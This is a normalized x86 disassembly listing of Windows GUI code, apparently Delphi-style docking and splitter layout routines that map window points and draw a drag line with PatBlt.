mov eax [ esi + 0x14 ]
call sub_440990
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447053
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ee14
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_440954
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43ce24
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_447094
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_442790
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43cecc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43ce88
mov ecx eax
xor edx edx
xor eax eax
call sub_412cd4
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_443c60
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412cfc
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_447208
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_447208
pop ecx
mov eax ebx
call sub_403124
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_447208
pop ecx
sub_44723c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_447208
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403124
xor eax eax
mov [ esi + 0x64 ] eax
sub_447298
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4462a8
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4472d4
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4472d4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_447541
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x8 ]
pop eax
call sub_4041c0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ ebx + 0x14 ]
call sub_445a34
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x10 ]
pop eax
call sub_4041c0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403124
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447548
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f1c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_445de4
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_445f5c
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_445f98
mov eax [ ebx + 0x18 ]
call sub_445de4
mov [ edx + 0x18 ] eax
push esi
push sub_447ae4
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446310
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_445f98
mov eax [ esi + 0x64 ]
call sub_445f5c
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403124
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_447abc
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403124
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_445ae0
mov edx eax
mov eax edi
call sub_445f84
mov eax edi
call sub_445de4
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_447ae4
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_446310
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_447ae4
mov edx [ eax + 0x14 ]
mov eax esi
call sub_446310
mov eax [ ebx + 0x14 ]
call sub_403124
mov eax edi
call sub_403124
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_447550
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_442790
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407bec
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_445f84
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4426fc
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_445f84
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44796c
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_447ae4
xor edx edx
mov eax edi
call sub_446310
sub_44762c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_445f5c
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402938
mov edx eax
mov eax ebx
call sub_445f84
sub_447668
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_4476d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4476da
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4476e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44778f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_445cec
mov eax [ ebp - 0x8 ]
call sub_447668
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_4476e0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447796
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_4476e0
pop ecx
sub_44779c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4478d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447884
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4426fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44788b
mov eax [ ebp - 0x10 ]
call sub_403124
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_447668
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_442710
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44788b
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_4476e0
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4478dc
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
sub_4478e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446034
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44605c
call sub_4478e4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446034
call sub_4478e4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_445a64
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_445f5c
mov edx eax
mov eax ebx
call sub_445f84
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_445f84
jmp r-xdata
sub_44796c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4478e4
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4479b0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_445f5c
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_445f84
sub_4479e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_443c60
mov edx eax
mov eax [ rw-data ]
call sub_448540
mov eax [ ebx + 0x14 ]
call sub_443c60
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_447af4
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_447a40
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_448540
mov eax ebx
call sub_447af4
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_445f84
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_445f84
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44796c
push ebx
push sub_447ae4
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_446310
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_447abc
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4426fc
test eax eax
jle r-xdata
push ebx
push sub_447ae4
xor edx edx
mov eax ebx
call sub_446310
sub_447af4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_445b28
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_445b28
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_445b94
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_445b94
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41e680
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_447be0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_447be0
pop ecx
mov eax ebx
call sub_445f5c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445f5c
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_447be0
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_445f5c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_425308
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_447c70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445f5c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_445ae0
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_445f5c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_447be0
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447cc0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43ce24
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ce24
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_447d3c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4459ec
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_445a98
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_446040
test eax eax
je r-xdata
mov eax esi
call sub_445a64
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_447ae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_446310
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446040
mov edx [ ebx + 0x20 ]
call sub_445f98
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_447d3c
pop ecx
sub_447dbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_445a48
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_445a48
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_446040
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_447dbc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_447ae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_446310
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_445c44
mov eax edi
call sub_446034
test eax eax
je r-xdata
mov eax edi
call sub_446040
mov esi eax
mov eax esi
call sub_445f5c
push eax
mov eax esi
call sub_445a98
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_446034
call sub_445f5c
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_445f5c
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_445f84
mov eax esi
call sub_445f5c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_445f84
mov eax edi
call sub_446040
call sub_445fd4
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_445a98
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_445f84
mov eax edi
